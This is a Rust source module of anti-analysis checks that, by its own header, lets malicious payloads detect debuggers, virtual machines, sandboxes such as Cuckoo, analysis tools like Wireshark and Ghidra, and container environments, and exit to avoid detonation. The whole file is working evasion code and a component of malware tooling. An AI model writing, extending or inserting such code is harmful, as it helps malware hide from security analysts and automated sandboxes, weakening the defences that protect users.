//! Anti-analysis checks: sandbox, debugger, and VM detection.
//!
//! These checks help payloads determine if they're running in an
//! analysis environment and exit gracefully to avoid detonation.

use std::collections::HashSet;

/// Result of anti-analysis checks
#[derive(Debug, Clone)]
pub struct AnalysisReport {
    pub checks: Vec<CheckResult>,
    pub is_analysis_env: bool,
    pub confidence: f64, // 0.0 - 1.0
}

#[derive(Debug, Clone)]
pub struct CheckResult {
    pub name: String,
    pub detected: bool,
    pub detail: String,
}

/// Run all available anti-analysis checks
pub fn run_all_checks() -> AnalysisReport {
    let checks = vec![
        check_debugger(),
        check_vm_artifacts(),
        check_sandbox_artifacts(),
        check_timing(),
        check_username(),
        check_hostname(),
        check_hardware(),
        check_process_list(),
        check_file_artifacts(),
        check_network(),
    ];

    let detected_count = checks.iter().filter(|c| c.detected).count();
    let confidence = detected_count as f64 / checks.len() as f64;

    AnalysisReport {
        is_analysis_env: confidence > 0.3, // 30% threshold
        confidence,
        checks,
    }
}

/// Check for attached debugger (Linux: TracerPid in /proc/self/status)
pub fn check_debugger() -> CheckResult {
    let detected = check_tracer_pid();
    CheckResult {
        name: "debugger".into(),
        detected,
        detail: if detected { "TracerPid != 0".into() } else { "no debugger detected".into() },
    }
}

fn check_tracer_pid() -> bool {
    std::fs::read_to_string("/proc/self/status")
        .ok()
        .and_then(|s| {
            s.lines()
                .find(|l| l.starts_with("TracerPid:"))
                .map(|l| {
                    let pid = l.split_whitespace().nth(1).unwrap_or("0");
                    pid != "0"
                })
        })
        .unwrap_or(false)
}

/// Check for VM hypervisor artifacts
pub fn check_vm_artifacts() -> CheckResult {
    let mut indicators = Vec::new();

    // Check DMI/SMBIOS for VM strings
    if let Ok(vendor) = std::fs::read_to_string("/sys/class/dmi/id/sys_vendor") {
        let vendor = vendor.trim().to_lowercase();
        let vm_vendors = ["vmware", "virtualbox", "qemu", "xen", "microsoft corporation",
                          "parallels", "innotek", "oracle"];
        if vm_vendors.iter().any(|v| vendor.contains(v)) {
            indicators.push(format!("sys_vendor: {vendor}"));
        }
    }

    // Check product name
    if let Ok(product) = std::fs::read_to_string("/sys/class/dmi/id/product_name") {
        let product = product.trim().to_lowercase();
        let vm_products = ["virtual", "vmware", "virtualbox", "kvm", "hvm", "bochs"];
        if vm_products.iter().any(|v| product.contains(v)) {
            indicators.push(format!("product: {product}"));
        }
    }

    // Check for hypervisor in cpuinfo
    if let Ok(cpuinfo) = std::fs::read_to_string("/proc/cpuinfo") {
        if cpuinfo.contains("hypervisor") {
            indicators.push("hypervisor flag in cpuinfo".into());
        }
    }

    // Check for VM-specific kernel modules
    if let Ok(modules) = std::fs::read_to_string("/proc/modules") {
        let vm_modules = ["vmw_balloon", "vboxguest", "vboxsf", "virtio", "xen_blkfront",
                          "hv_vmbus", "hv_storvsc"];
        for m in vm_modules {
            if modules.contains(m) {
                indicators.push(format!("kernel module: {m}"));
            }
        }
    }

    let detected = !indicators.is_empty();
    CheckResult {
        name: "vm_artifacts".into(),
        detected,
        detail: if detected { indicators.join(", ") } else { "no VM artifacts".into() },
    }
}

/// Check for sandbox-specific artifacts
pub fn check_sandbox_artifacts() -> CheckResult {
    let mut indicators = Vec::new();

    // Low uptime (recently booted, typical of sandboxes)
    if let Ok(uptime) = std::fs::read_to_string("/proc/uptime") {
        if let Some(secs_str) = uptime.split_whitespace().next() {
            if let Ok(secs) = secs_str.parse::<f64>() {
                if secs < 300.0 { // Less than 5 minutes
                    indicators.push(format!("low uptime: {secs:.0}s"));
                }
            }
        }
    }

    // Small disk (sandboxes often have minimal storage)
    if let Ok(stat) = std::fs::metadata("/") {
        // Can't easily get total disk size from metadata alone,
        // but we can check for other indicators
        let _ = stat;
    }

    // Few running processes
    if let Ok(entries) = std::fs::read_dir("/proc") {
        let pid_count = entries
            .filter_map(|e| e.ok())
            .filter(|e| e.file_name().to_string_lossy().parse::<u32>().is_ok())
            .count();
        if pid_count < 20 {
            indicators.push(format!("low process count: {pid_count}"));
        }
    }

    // Check for common sandbox filenames
    let sandbox_files = [
        "/tmp/malware",
        "/var/log/cuckoo",
        "/opt/cuckoo",
        "/usr/share/inetsim",
    ];
    for path in sandbox_files {
        if std::path::Path::new(path).exists() {
            indicators.push(format!("sandbox file: {path}"));
        }
    }

    let detected = !indicators.is_empty();
    CheckResult {
        name: "sandbox".into(),
        detected,
        detail: if detected { indicators.join(", ") } else { "no sandbox artifacts".into() },
    }
}

/// Timing check: sleep and verify wall clock advanced correctly
pub fn check_timing() -> CheckResult {
    let start = std::time::Instant::now();
    std::thread::sleep(std::time::Duration::from_millis(100));
    let elapsed = start.elapsed().as_millis();

    // If sleep was fast-forwarded (elapsed << 100ms) or
    // significantly delayed (elapsed >> 100ms), suspicious
    let suspicious = elapsed < 50 || elapsed > 500;

    CheckResult {
        name: "timing".into(),
        detected: suspicious,
        detail: format!("100ms sleep took {}ms", elapsed),
    }
}

/// Check for suspicious usernames common in sandboxes
pub fn check_username() -> CheckResult {
    let user = std::env::var("USER")
        .or_else(|_| std::env::var("LOGNAME"))
        .unwrap_or_default()
        .to_lowercase();

    let suspicious_users: HashSet<&str> = [
        "sandbox", "malware", "virus", "test", "sample", "admin",
        "user", "analyst", "remnux", "flare", "cuckoo", "cape",
        "john", "jane", "joe", "any.run",
    ].iter().copied().collect();

    let detected = suspicious_users.contains(user.as_str());
    CheckResult {
        name: "username".into(),
        detected,
        detail: format!("user: {user}"),
    }
}

/// Check for suspicious hostnames
pub fn check_hostname() -> CheckResult {
    let hostname = std::fs::read_to_string("/etc/hostname")
        .unwrap_or_default()
        .trim()
        .to_lowercase();

    let suspicious = ["sandbox", "malware", "vm", "analysis", "test",
                      "cuckoo", "cape", "remnux", "flare", "localhost"];

    let detected = suspicious.iter().any(|s| hostname.contains(s));
    CheckResult {
        name: "hostname".into(),
        detected,
        detail: format!("hostname: {hostname}"),
    }
}

/// Check hardware indicators (CPU count, RAM)
pub fn check_hardware() -> CheckResult {
    let mut indicators = Vec::new();

    // Low CPU count (sandboxes often have 1-2 CPUs)
    let cpu_count = std::thread::available_parallelism()
        .map(|n| n.get())
        .unwrap_or(1);
    if cpu_count <= 1 {
        indicators.push(format!("low CPU count: {cpu_count}"));
    }

    // Low RAM (< 2GB)
    if let Ok(meminfo) = std::fs::read_to_string("/proc/meminfo") {
        if let Some(line) = meminfo.lines().find(|l| l.starts_with("MemTotal:")) {
            if let Some(kb_str) = line.split_whitespace().nth(1) {
                if let Ok(kb) = kb_str.parse::<u64>() {
                    if kb < 2_000_000 { // < 2GB
                        indicators.push(format!("low RAM: {}MB", kb / 1024));
                    }
                }
            }
        }
    }

    let detected = !indicators.is_empty();
    CheckResult {
        name: "hardware".into(),
        detected,
        detail: if detected { indicators.join(", ") } else { "hardware looks normal".into() },
    }
}

/// Check for analysis tools in process list
pub fn check_process_list() -> CheckResult {
    let analysis_tools = [
        "wireshark", "tcpdump", "strace", "ltrace", "gdb", "radare2",
        "ida", "ghidra", "x64dbg", "ollydbg", "procmon", "processhacker",
        "autoruns", "sysmon", "volatility", "r2", "frida", "burp",
    ];

    let mut found = Vec::new();

    if let Ok(entries) = std::fs::read_dir("/proc") {
        for entry in entries.flatten() {
            let pid = entry.file_name().to_string_lossy().to_string();
            if pid.parse::<u32>().is_err() {
                continue;
            }
            let comm_path = format!("/proc/{pid}/comm");
            if let Ok(comm) = std::fs::read_to_string(&comm_path) {
                let comm = comm.trim().to_lowercase();
                if analysis_tools.iter().any(|t| comm.contains(t)) {
                    found.push(comm);
                }
            }
        }
    }

    let detected = !found.is_empty();
    CheckResult {
        name: "analysis_tools".into(),
        detected,
        detail: if detected { format!("found: {}", found.join(", ")) } else { "no analysis tools".into() },
    }
}

/// Check for analysis-related files
pub fn check_file_artifacts() -> CheckResult {
    let indicators = [
        ("/proc/vz", "OpenVZ container"),
        ("/proc/xen", "Xen hypervisor"),
        ("/.dockerenv", "Docker container"),
        ("/run/.containerenv", "Podman container"),
    ];

    let mut found = Vec::new();
    for (path, desc) in indicators {
        if std::path::Path::new(path).exists() {
            found.push(desc.to_string());
        }
    }

    let detected = !found.is_empty();
    CheckResult {
        name: "file_artifacts".into(),
        detected,
        detail: if detected { found.join(", ") } else { "no file artifacts".into() },
    }
}

/// Check network indicators (few interfaces, specific MAC prefixes)
pub fn check_network() -> CheckResult {
    let mut indicators = Vec::new();

    // Check for VM MAC address prefixes
    let vm_mac_prefixes = [
        "00:0c:29", // VMware
        "00:50:56", // VMware
        "08:00:27", // VirtualBox
        "52:54:00", // QEMU/KVM
        "00:1c:14", // VMware
        "00:15:5d", // Hyper-V
    ];

    if let Ok(entries) = std::fs::read_dir("/sys/class/net") {
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name == "lo" {
                continue;
            }
            let mac_path = format!("/sys/class/net/{name}/address");
            if let Ok(mac) = std::fs::read_to_string(&mac_path) {
                let mac = mac.trim().to_lowercase();
                if vm_mac_prefixes.iter().any(|p| mac.starts_with(p)) {
                    indicators.push(format!("{name}: {mac}"));
                }
            }
        }
    }

    let detected = !indicators.is_empty();
    CheckResult {
        name: "network".into(),
        detected,
        detail: if detected { format!("VM MACs: {}", indicators.join(", ")) } else { "no VM MACs".into() },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_run_all_checks() {
        let report = run_all_checks();
        assert_eq!(report.checks.len(), 10);
        assert!(report.confidence >= 0.0 && report.confidence <= 1.0);
    }

    #[test]
    fn test_timing_check() {
        let result = check_timing();
        // In a normal environment, timing should pass
        assert_eq!(result.name, "timing");
    }

    #[test]
    fn test_debugger_check() {
        let result = check_debugger();
        assert_eq!(result.name, "debugger");
        // In test environment, usually no debugger attached
    }

    #[test]
    fn test_username_check() {
        let result = check_username();
        assert_eq!(result.name, "username");
    }
}
